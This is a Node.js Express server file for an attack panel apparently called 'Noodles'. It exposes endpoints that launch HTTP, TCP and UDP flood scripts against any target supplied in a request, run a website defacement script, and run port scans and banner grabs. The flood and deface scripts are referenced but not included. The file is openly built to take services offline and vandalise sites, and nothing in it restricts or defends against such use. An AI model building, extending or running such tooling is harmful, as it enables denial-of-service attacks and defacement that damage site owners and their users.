const express = require('express');
const app = express();
const port = 3000;
const path = require('path');
const { spawn } = require('child_process');

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Function to execute shell commands
function executeCommand(command, args) {
    return new Promise((resolve, reject) => {
        const process = spawn(command, args);
        let result = '';

        process.stdout.on('data', (data) => {
            result += data.toString();
            console.log(`stdout: ${data}`);
        });

        process.stderr.on('data', (data) => {
            console.error(`stderr: ${data}`);
            reject(data.toString());
        });

        process.on('close', (code) => {
            if (code === 0) {
                resolve(result);
            } else {
                reject(`Command failed with code ${code}`);
            }
        });
    });
}

// DDoS attack endpoint
app.post('/api/ddos', async (req, res) => {
    const target = req.body.target;
    const type = req.body.type;
    const duration = req.body.duration || 60; // Default duration: 60 seconds
    console.log(`DDoS attack requested: Target=${target}, Type=${type}, Duration=${duration}`);

    try {
        let scriptPath;
        let args;

        switch (type) {
            case 'http':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'http_flood.js');
                if (!require('fs').existsSync(scriptPath)) {
                    return res.status(500).send({ status: 'HTTP Flood script not found' });
                }
                args = [target, duration];
                break;
            case 'tcp':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'tcp_flood.js');
                if (!require('fs').existsSync(scriptPath)) {
                    return res.status(500).send({ status: 'TCP Flood script not found' });
                }
                args = [target, duration];
                break;
            case 'udp':
                scriptPath = path.join(__dirname, 'scripts', 'ddos', 'udp_flood.js');
                if (!require('fs').existsSync(scriptPath)) {
                    return res.status(500).send({ status: 'UDP Flood script not found' });
                }
                args = [target, duration];
                break;
            default:
                return res.status(400).send({ status: 'Invalid DDoS attack type' });
        }

        // Execute the DDoS attack script
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `DDoS attack initiated (${type}) on ${target} for ${duration} seconds` });
    } catch (error) {
        console.error(`DDoS attack failed: ${error}`);
        res.status(500).send({ status: `DDoS attack failed: ${error}` });
    }
});

// Defacement endpoint
app.post('/api/defacement', async (req, res) => {
    const target = req.body.target;
    const action = req.body.action;
    const content = req.body.content;
    console.log(`Defacement requested: Target=${target}, Action=${action}`);

    try {
        const scriptPath = path.join(__dirname, 'scripts', 'defacement', 'deface.js');
        if (!require('fs').existsSync(scriptPath)) {
            return res.status(500).send({ status: 'Deface script not found' });
        }
        const args = [target, action, content];

        // Execute the defacement script
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `Defacement initiated (${action}) on ${target}` });
    } catch (error) {
        console.error(`Defacement failed: ${error}`);
        res.status(500).send({ status: `Defacement failed: ${error}` });
    }
});

// Connection endpoint
app.post('/api/connection', async (req, res) => {
    const target = req.body.target;
    const type = req.body.type;
    console.log(`Connection requested: Target=${target}, Type=${type}`);

    try {
        let scriptPath;
        let args;

        switch (type) {
            case 'portscan':
                scriptPath = path.join(__dirname, 'scripts', 'connection', 'port_scan.js');
                if (!require('fs').existsSync(scriptPath)) {
                    return res.status(500).send({ status: 'Port Scan script not found' });
                }
                args = [target];
                break;
            case 'bannergrab':
                scriptPath = path.join(__dirname, 'scripts', 'connection', 'banner_grab.js');
                if (!require('fs').existsSync(scriptPath)) {
                    return res.status(500).send({ status: 'Banner Grab script not found' });
                }
                args = [target];
                break;
            default:
                return res.status(400).send({ status: 'Invalid connection type' });
        }

        // Execute the connection script
        await executeCommand('node', [scriptPath, ...args]);
        res.send({ status: `Connection initiated (${type}) on ${target}` });
    } catch (error) {
        console.error(`Connection failed: ${error}`);
        res.status(500).send({ status: `Connection failed: ${error}` });
    }
});

// About Us page
app.get('/about', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'about.html'));
});

// Redirect to index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(port, () => {
    console.log(`Noodles app listening on port ${port}`);
});